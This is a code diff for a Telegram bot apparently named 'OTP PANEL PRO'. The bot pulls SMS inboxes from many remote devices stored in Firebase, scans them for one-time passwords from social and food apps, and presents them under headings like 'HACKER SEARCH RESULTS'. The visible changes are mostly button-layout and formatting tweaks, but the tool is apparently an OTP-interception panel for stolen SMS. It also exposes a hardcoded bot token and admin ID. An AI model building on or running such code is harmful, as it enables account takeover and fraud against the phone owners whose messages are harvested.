@@ -63,7 +63,7 @@ POLL_INTERVAL   = 10
 CACHE_INTERVAL  = 600 
 SMS_LIMIT       = 20       
 TOKEN           = "8877437030:AAFGon2GuBerdgA2o5QGDBrc8BpBQOsIgr4"
-PAGE_SIZE       = 10
+PAGE_SIZE       = 14  # Increased to show 14 devices (7 rows of 2) per page
 
 ADMIN_IDS: set[int] = {6860106371}
 MANDATORY_CHATS = ["@leakmethodfree", "@sabkijayhokhush", "@rosekhudkabanaya"]
@@ -530,6 +530,20 @@ async def verify_recent_sms(device: Device, max_age_seconds=14400) -> bool:
     except: pass
     return False
 
+# 🔥 PREMIUM 2-COLUMN BUTTON FORMATTER
+def _format_btn_label(d: Device) -> str:
+    icon = "🟢" if d.status == "online" else "🔴"
+    if d.numbers:
+        main_num = str(d.numbers[0])
+        display_num = main_num if main_num.startswith("+") else f"+{main_num}"
+        # Trim very long numbers to keep buttons compact
+        if len(display_num) > 14: display_num = display_num[:13] + "…"
+        lbl = f"{icon} {display_num}"
+        if len(d.numbers) > 1: lbl += " ⧉" # Clean indicator for multiple SIMs
+    else:
+        lbl = f"{icon} {d.name[:8]}"
+    return lbl
+
 async def show_fresh30_page(message_obj, chat_id, page, bot_token, users_db):
     dev_ids = user_fresh_cache.get(chat_id, [])
     if not dev_ids:
@@ -547,20 +561,24 @@ async def show_fresh30_page(message_obj, chat_id, page, bot_token, users_db):
 
     text = f"🔥 <b>30-MIN FRESH INBOXES</b> 🔥\n━━━━━━━━━━━━━━━━━━\n✅ Total Active Numbers: {total_devs}\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number to view OTP:</i>"
 
+    # Use 2-column layout here too
     kb = []
+    row = []
     for did in page_ids:
         d = dev_map.get(did)
-        if d and d.numbers:
-            display_num = d.numbers[0] if str(d.numbers[0]).startswith("+") else f"+{d.numbers[0]}"
-            lbl = f"📱 {display_num}  [{d.db_tag}]"
-            kb.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
-            kb.append([InlineKeyboardButton("📩 View Inbox", callback_data=f"msgs:{d.id}:f30_{page}")])
+        if d:
+            row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}"))
+            if len(row) == 2:
+                kb.append(row)
+                row = []
+    if row: kb.append(row)
 
     nav = []
     if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"f30:{page-1}"))
+    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"f30:{page+1}"))
-    
     if nav: kb.append(nav)
+    
     kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="home")])
     await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
@@ -620,47 +638,53 @@ def device_list_header(devices: list[Device], page: int = 0) -> str:
     if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"] and SCAN_PROGRESS["total"] > 1 and SCAN_PROGRESS["total"] != 99999:
         pct = int((SCAN_PROGRESS["completed"] / SCAN_PROGRESS["total"]) * 100)
         progress = f"🔄 Initial Scan: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
-    return f"OTP PANEL PRO\n━━━━━━━━━━━━━━━━━━\n{progress}Online: {online}   Offline: {offline}\nTotal: {len(devices)} Devices\nPage {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\nSelect a number below:"
+    return f"<b>📱 OTP PANEL PRO DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n{progress}🟢 Online: {online}   🔴 Offline: {offline}\n📊 Total: {len(devices)} Devices\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number below:</i>"
 
+# 🔥 PREMIUM 2-COLUMN DEVICE LIST KEYBOARD
 def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
     total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
     page        = max(0, min(page, total_pages - 1))
     start       = page * PAGE_SIZE
     page_devs   = devices[start : start + PAGE_SIZE]
+    
     rows = []
-    def _btn(d: Device) -> InlineKeyboardButton:
-        tag  = f"[{d.db_tag}] "
-        icon = "🟢" if d.status == "online" else "🔴"
-        if d.numbers:
-            lbl = f"{icon} {tag}{d.numbers[0]}"
-            if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
-        else: lbl = f"{icon} {tag}{d.name} ({d.id[:6]})"
-        return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")
+    row = []
+    for d in page_devs:
+        row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}"))
+        if len(row) == 2:
+            rows.append(row)
+            row = []
+    if row:
+        rows.append(row)
 
-    for d in page_devs: rows.append([_btn(d)])
     nav = []
-    if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data=f"pg:{page - 1}"))
-    nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
-    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next", callback_data=f"pg:{page + 1}"))
+    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"pg:{page - 1}"))
+    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
+    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"pg:{page + 1}"))
     rows.append(nav)
-    rows.append([InlineKeyboardButton("Refresh", callback_data="home"), InlineKeyboardButton("Online Only", callback_data="online")])
-    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
+    
+    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🟢 Online Only", callback_data="online")])
+    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
     return InlineKeyboardMarkup(rows)
 
+# 🔥 PREMIUM 2-COLUMN ONLINE LIST KEYBOARD
 def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
     online = [d for d in devices if d.status == "online"]
     rows = []
     if online:
+        row = []
         for d in online[:100]: 
-            tag = f"[{d.db_tag}] "
-            if d.numbers:
-                lbl = f"🟢 {tag}{d.numbers[0]}"
-                if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
-            else: lbl = f"🟢 {tag}{d.name} ({d.id[:6]})"
-            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
-    else: rows.append([InlineKeyboardButton("No devices online", callback_data="noop")])
-    rows.append([InlineKeyboardButton("Refresh", callback_data="online"), InlineKeyboardButton("All Numbers", callback_data="pg:0")])
-    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
+            row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}"))
+            if len(row) == 2:
+                rows.append(row)
+                row = []
+        if row:
+            rows.append(row)
+    else: 
+        rows.append([InlineKeyboardButton("📭 No devices online", callback_data="noop")])
+        
+    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="online"), InlineKeyboardButton("📋 All Numbers", callback_data="pg:0")])
+    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
     return InlineKeyboardMarkup(rows)
 
 def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
@@ -772,7 +796,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, "🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
             return
 
-        # 🔥 FIX: SMART AUTO-CHECKER LOGIC ADDED HERE 🔥
         if data.startswith("auto_fb:"):
             service = data.split(":")[1]
             await safe_edit(query, f"⏳ <b>AUTO-CHECKING LIVE NUMBERS</b>\n━━━━━━━━━━━━━━━━━━\nScanning all online devices for <b>{service.capitalize()}</b>...\n<i>Please wait, this might take a few seconds...</i>", parse_mode="HTML")
@@ -784,9 +807,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await safe_edit(query, "❌ Koi bhi number abhi online nahi hai. Thodi der baad try karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="open_auto_checker_menu")]]))
                 return
                 
-            # Grab up to 40 latest online numbers to prevent API ban
             target_nums = [d.numbers[0][-10:] for d in online_devs[:40]]
-            
             bulk_results = []
             tasks = [check_number_api(service, num) for num in target_nums]
             res_list = await asyncio.gather(*tasks, return_exceptions=True)
@@ -825,7 +846,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 if (now - ts) <= 86400 or d.status == "online": recent_devs.append(d)
             
             found_devs = []
-            
             async def check_dev_for_keyword(d: Device):
                 try:
                     sms_data = await fb_get(f"{d.sms_path}?orderBy=\"$key\"&limitToLast=10", d.base_url)
@@ -848,12 +868,13 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await safe_edit(query, f"📭 <b>NO RESULTS</b>\nKoi bhi <b>{keyword.upper()}</b> ka OTP pichle 24 ghante mein nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="open_app_search")]]), parse_mode="HTML")
                 return
                 
-            rows = []
-            for d in found_devs[:15]:
-                tag = f"[{d.db_tag}] "
-                icon = "🟢" if d.status == "online" else "🔴"
-                lbl = f"{icon} {tag}{' & '.join(d.numbers) if d.numbers else d.id[:6]}"
-                rows.append([InlineKeyboardButton(lbl, callback_data=f"msgs:{d.id}")])
+            rows, row = [], []
+            for d in found_devs[:16]:
+                row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"msgs:{d.id}"))
+                if len(row) == 2:
+                    rows.append(row)
+                    row = []
+            if row: rows.append(row)
                 
             rows.append([InlineKeyboardButton("🔙 Back to Apps", callback_data="open_app_search")])
             text = f"🎯 <b>HACKER SEARCH RESULTS</b>\n━━━━━━━━━━━━━━━━━━\n🔎 App: <b>{keyword.upper()}</b>\n📱 Found in {len(found_devs)} devices (Last 24h)\n━━━━━━━━━━━━━━━━━━\nClick to view exact OTP:"
@@ -940,20 +961,20 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
             devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
+            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
             return
 
         if data.startswith("pg:"):
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             page = int(data[3:])
             devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
+            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page), parse_mode="HTML")
             return
 
         if data == "online":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, f"ONLINE NUMBERS\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices))
+            await safe_edit(query, f"<b>🟢 ONLINE NUMBERS</b>\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices), parse_mode="HTML")
             return
 
         if data.startswith("cp:"):
@@ -1169,7 +1190,7 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         user_focus.setdefault(bot_token, {}).pop(chat_id, None)
         pending_action.pop(chat_id, None)
         devices = await get_all_devices(bot_token, chat_id, users_db)
-        await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
+        await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
         return
 
     if text == "Manual Checker":
@@ -1280,7 +1301,13 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(wait_msg, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
             return
             
-        rows = [[InlineKeyboardButton(f"Messages: {'🟢' if d.status == 'online' else '🔴'} [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"msgs:{d.id}")] for d in found_devs[:10]]
+        rows, row = [], []
+        for d in found_devs[:16]:
+            row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"msgs:{d.id}"))
+            if len(row) == 2:
+                rows.append(row)
+                row = []
+        if row: rows.append(row)
         rows.append([InlineKeyboardButton("Back to Home", callback_data="home")])
         await safe_edit(wait_msg, f"Search Results for: {', '.join(search_terms)}\nDirectly open inbox:", reply_markup=InlineKeyboardMarkup(rows))
         return
